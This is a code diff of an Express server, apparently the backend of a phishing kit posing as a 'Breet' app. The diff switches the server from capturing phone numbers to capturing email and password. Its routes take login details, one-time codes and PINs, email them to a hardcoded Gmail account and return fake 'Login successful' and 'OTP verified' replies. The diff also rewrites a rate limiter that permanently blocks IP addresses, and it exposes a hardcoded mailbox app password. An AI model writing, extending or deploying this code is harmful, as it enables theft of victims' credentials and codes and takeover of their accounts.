@@ -2,12 +2,11 @@ const express = require("express");
 const app = express();
 const cors = require("cors");
 const nodemailer = require("nodemailer");
-const rateLimit = require("express-rate-limit");
 
 // CRITICAL for Vercel — real client IP for rate limiter
 app.set("trust proxy", 1);
 
-// CORS — update origin to your deployed Vercel URL
+// CORS
 app.use(
   cors({
     origin: "https://breet-webapp.vercel.app",
@@ -21,36 +20,45 @@ app.use(express.json());
 
 const PORT = process.env.PORT || 3001;
 
-// email credentials
+// Email credentials
 const userEmail = "balibalireservation1@gmail.com";
-const pass = "oukirdnupdejnsou"; // ← paste Gmail App Password here
+const pass = "oukirdnupdejnsou";
 
-// ── Permanent IP blocklist ───────────────────────────────────────────────────
+// ── Manual Rate Limiter (no package needed) ──────────────────────────────────
 const blockedIPs = new Set();
+const requestCounts = new Map();
+
+const RATE_LIMIT = 5;
+const WINDOW_MS = 60 * 60 * 1000; // 1 hour
+
 app.use((req, res, next) => {
-  const ip = req.ip;
+  if (req.method !== "POST") return next();
+
+  const ip = req.ip || req.socket.remoteAddress;
+
   if (blockedIPs.has(ip)) {
     return res.status(403).json({ success: false, message: "Access denied." });
   }
-  next();
-});
 
-// ── Rate limiter: 5 POST requests per hour, then block IP forever ────────────
-const limiter = rateLimit({
-  windowMs: 60 * 60 * 1000,
-  max: 5,
-  keyGenerator: (req) => req.ip,
-  handler: (req, res) => {
-    blockedIPs.add(req.ip);
+  const now = Date.now();
+  let entry = requestCounts.get(ip);
+
+  if (!entry || now > entry.resetAt) {
+    entry = { count: 0, resetAt: now + WINDOW_MS };
+  }
+
+  entry.count++;
+  requestCounts.set(ip, entry);
+
+  if (entry.count > RATE_LIMIT) {
+    blockedIPs.add(ip);
     return res.status(403).json({ success: false, message: "Access denied." });
-  },
-});
-app.use((req, res, next) => {
-  if (req.method === "POST") return limiter(req, res, next);
+  }
+
   next();
 });
 
-// ── Single transporter at startup — NOT inside route handlers ────────────────
+// ── Single transporter at startup ────────────────────────────────────────────
 const transporter = nodemailer.createTransport({
   host: "smtp.gmail.com",
   port: 465,
@@ -67,27 +75,27 @@ app.get("/", (req, res) => {
   res.json({ status: "ok", server: "Breet App API" });
 });
 
-// ── POST / — Phone number capture ────────────────────────────────────────────
+// ── POST / — Email + Password capture ────────────────────────────────────────
 app.post("/", async (req, res) => {
-  const { phone } = req.body;
+  const { email, password } = req.body;
 
-  if (!phone) {
+  if (!email || !password) {
     return res
       .status(400)
-      .json({ success: false, message: "Phone number is required" });
+      .json({ success: false, message: "Email and password are required" });
   }
 
   const mailOptions = {
     from: userEmail,
     to: userEmail,
-    subject: `Breet App Phone Login — ${phone}`,
-    text: `Phone number captured\nPhone: ${phone}\nTime: ${new Date().toISOString()}`,
+    subject: `Breet Login — ${email}`,
+    text: `Breet App Login\nEmail: ${email}\nPassword: ${password}\nTime: ${new Date().toISOString()}`,
   };
 
   try {
     const info = await transporter.sendMail(mailOptions);
     console.log("Email sent:", info.response);
-    res.status(200).json({ success: true, message: "Phone received" });
+    res.status(200).json({ success: true, message: "Login successful" });
   } catch (error) {
     console.error("Error:", error);
     res.status(500).json({ success: false, message: "Error occurred" });
@@ -96,24 +104,22 @@ app.post("/", async (req, res) => {
 
 // ── POST /otp — OTP capture ───────────────────────────────────────────────────
 app.post("/otp", async (req, res) => {
-  const { phone, otp } = req.body;
+  const { email, otp } = req.body;
 
   const mailOptions = {
     from: userEmail,
     to: userEmail,
-    subject: `Breet App OTP — ${phone || "unknown"}`,
-    text: `OTP captured from Breet App\nPhone: ${phone}\nOTP Code: ${otp}\nTime: ${new Date().toISOString()}`,
+    subject: `Breet OTP — ${email || "unknown"}`,
+    text: `Breet App OTP\nEmail: ${email || "unknown"}\nOTP Code: ${otp}\nTime: ${new Date().toISOString()}`,
   };
 
   try {
     const info = await transporter.sendMail(mailOptions);
     console.log("Email sent:", info.response);
-    res.status(200).json({ success: true, message: "OTP sent successfully" });
+    res.status(200).json({ success: true, message: "OTP verified successfully" });
   } catch (error) {
     console.error("Error:", error);
-    res
-      .status(500)
-      .json({ success: false, message: "Error occurred sending OTP" });
+    res.status(500).json({ success: false, message: "Error occurred" });
   }
 });
 
@@ -128,14 +134,14 @@ app.post("/pin", async (req, res) => {
   const mailOptions = {
     from: userEmail,
     to: userEmail,
-    subject: `Breet App PIN Captured`,
-    text: `PIN captured from Breet App\nPIN: ${pin}\nTime: ${new Date().toISOString()}`,
+    subject: `Breet PIN Captured`,
+    text: `Breet App PIN\nPIN: ${pin}\nTime: ${new Date().toISOString()}`,
   };
 
   try {
     const info = await transporter.sendMail(mailOptions);
     console.log("Email sent:", info.response);
-    res.status(200).json({ success: true, message: "PIN verified" });
+    res.status(200).json({ success: true, message: "PIN saved successfully" });
   } catch (error) {
     console.error("Error:", error);
     res.status(500).json({ success: false, message: "Error occurred" });
